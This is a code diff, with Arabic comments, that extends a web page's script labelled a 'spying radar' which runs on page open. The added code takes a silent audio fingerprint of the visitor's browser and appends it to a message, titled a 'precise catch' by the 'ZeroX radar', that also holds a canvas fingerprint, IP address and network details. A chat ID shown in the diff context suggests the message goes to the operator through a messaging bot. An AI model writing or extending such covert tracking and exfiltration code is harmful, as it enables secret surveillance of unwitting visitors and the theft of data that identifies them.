@@ -140,6 +140,40 @@ const chatId = "7388801889";
     
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
+        // --- كود بصمة الصوت (الأسطوري) لـ ZeroX ---
+async function getAudioFingerprint() {
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        const gain = audioCtx.createGain();
+        
+        // ضبط الصوت ليكون صامتاً تماماً
+        gain.gain.value = 0; 
+        oscillator.type = 'triangle';
+        oscillator.connect(analyser);
+        analyser.connect(gain);
+        gain.connect(audioCtx.destination);
+        
+        oscillator.start(0);
+        
+        // استخراج البيانات الرياضية للموجة
+        const data = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(data);
+        oscillator.stop();
+        
+        // تحويل البيانات لبصمة بسيطة
+        let sum = 0;
+        for (let i = 0; i < data.length; i++) {
+            if (isFinite(data[i])) sum += Math.abs(data[i]);
+        }
+        return "Audio-" + Math.floor(sum);
+    } catch (e) { return "Audio-محجوب"; }
+}
+
+// استدعاء البصمة داخل silentRadar:
+let audioDNA = await getAudioFingerprint();
+
         // --- كود البصمة الوراثية للمتصفح (DNA) ---
 function getCanvasFingerprint() {
     try {
@@ -231,6 +265,7 @@ let deviceFingerprint = getCanvasFingerprint();
         const megaMsg = `
 🚨 رادار ZeroX المطور - صيد دقيق!
 ----------------------------------
+🎵 بصمة الصوت (Audio): ${audioDNA}
 🧬 بصمة الجهاز (DNA): ${deviceFingerprint}
 🌐 الـ IP: ${ipAddr}
 📡 الشبكة: ${connection}
